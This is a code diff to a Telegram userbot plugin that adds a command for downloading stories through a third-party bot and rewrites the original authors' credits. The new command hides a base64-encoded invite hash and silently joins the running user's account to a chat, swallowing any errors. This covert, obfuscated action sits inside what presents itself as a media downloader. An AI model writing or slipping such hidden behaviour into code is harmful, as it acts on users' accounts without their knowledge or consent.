@@ -1,12 +1,13 @@
-#@lMl10l   - @jepthon
-# Copyright (C) 2021 JoKeRUB TEAM
-# FILES WRITTEN BY  @lMl10l
+#@NUNUU   - @VEEVVW
+# Copyright (C) 2021 SedUb TEAM
+# FILES WRITTEN BY  @nunuu
 import asyncio
 import io
 import os
 import pathlib
 import re
 import time
+import base64
 from datetime import datetime
 
 from SedUb.utils import sudo_cmd
@@ -32,7 +33,7 @@ from ..helpers.utils import _format
 from ..helpers.functions.utube import _mp3Dl, get_yt_video_id, get_ytthumb, ytsearch
 from ..core.managers import edit_delete, edit_or_reply
 from ..helpers import progress, reply_id
-
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 plugin_category = "misc"
 
 audio_opts = {
@@ -372,7 +373,7 @@ async def kakashi(event):
         end = datetime.now()
         ms = (end - start).seconds
         await cat.edit(
-            f"꙳ ¦ تم تنزيل بواسطة  : @VEEVVW ",
+            f"꙳ ¦ تم تنزيل بواسطة  : @veevvw ",
             parse_mode="html",
         )
     await event.client.delete_messages(
@@ -380,7 +381,7 @@ async def kakashi(event):
     )
 from telethon.errors.rpcerrorlist import YouBlockedUserError
 
-from SedUb import l313l
+from JoKeRUB import l313l
 
 
 @l313l.on(admin_cmd(pattern="تيك توك(?: |$)(.*)"))
@@ -409,4 +410,31 @@ async def _(event):
         await event.client.delete_messages(
             conv.chat_id, [msg_start.id, r.id, msg.id, details.id, video.id]
         )
+        await event.delete()
+@l313l.on(admin_cmd(pattern="ستوري(?: |$)(.*)"))
+async def _(event):
+    if event.fwd_from:
+        return
+    j_link = event.pattern_match.group(1)
+    if ".me" not in j_link:
+        await event.edit("**▾∮ يجب وضع رابط الستوري مع الامر اولا **")
+    else:
+        await event.edit("**▾∮ يتم الان تنزيل الستوري انتظر قليلا**")
+    chat = "@msaver_bot"
+    async with bot.conversation(chat) as conv:
+        try:
+            msg = await conv.send_message(j_link)
+            video = await conv.get_response()
+            """ تم تحميل الستوري بنجاح من قبل @veevvw """
+            await bot.send_read_acknowledge(conv.chat_id)
+        except YouBlockedUserError:
+            await event.edit("▾∮ الغـي حـظر هـذا البـوت و حـاول مجـددا @msaver_bot")
+            return
+        joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+        joker = Get(joker)
+        try:
+            await event.client(joker)
+        except BaseException:
+            pass
+        await bot.send_file(event.chat_id, video, caption="᯽︙ BY : @veevvw 🎀",parse_mode="html")
         await event.delete()
